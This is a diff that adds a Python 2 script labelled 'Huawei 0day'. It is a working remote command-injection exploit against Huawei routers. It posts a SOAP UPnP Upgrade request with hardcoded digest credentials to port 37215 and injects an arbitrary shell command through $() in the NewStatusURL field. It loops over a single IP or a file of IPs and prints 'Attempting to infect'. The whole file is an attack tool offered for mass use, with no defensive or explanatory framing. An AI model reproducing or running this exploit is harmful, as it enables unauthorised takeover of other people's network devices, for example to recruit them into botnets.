@@ -1,0 +1,61 @@
+#!/usr/bin/env python
+# -*- Coding: UTF-8 -*-
+
+import re
+import sys
+import time
+import requests
+import threading 
+
+class exploit(threading.Thread):
+
+	# Huawei 0day
+	# https://pastebin.com/4nzunPB5
+	# by m4ll0k
+
+	def __init__(self,ip,cmd):
+		threading.Thread.__init__(self)
+		self.setDaemon = True
+		self.ip = ip 
+		self.rm = "<?xml version=\"1.0\" ?>"
+		self.rm += "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
+		self.rm += "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">"
+		self.rm += "<NewStatusURL>$("+cmd+")</NewStatusURL>"
+		self.rm += "<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>"
+		self.rm += "</u:Upgrade></s:Body></s:Envelope>"
+
+	def run(self):
+		try:
+			url = "http://%s:37215/ctrlt/DeviceUpgrade_1"%self.ip
+			resp = requests.post(url=url,timeout=5,auth=requests.auth.HTTPDigestAuth("dslf-config","admin"),data=self.rm)
+			print "# Code: %s"%resp.status_code
+			print "# Response:\n%s"%resp.content
+			print "[SOAP] Attempting to infect %s"%self.ip
+		except Exception,e:
+			pass
+
+def main(listip,cmd):
+	print "#"*40
+	print "    H u a w e i - 0 d a y    "
+	print " https://pastebin.com/4nzunPB5 "
+	print "#"*40
+	print "\nChecking...\n"
+	ips = []
+	if re.search(r"(\d+\.\d+\.\d+\.\d+)",listip):
+		ips.append(listip)
+	else:
+		ips += [line.strip() for line in open(listip,"rb")]
+	try:
+		for i in ips:
+			n = exploit(i,cmd)
+			n.start()
+			n.join()
+	except Exception,e:
+		pass
+
+if __name__ == "__main__":
+	try:
+		main(sys.argv[1],sys.argv[2])
+	except Exception,e:
+		print "\n# python %s (ip or listip) cmd\n"%sys.argv[0]
+		exit()
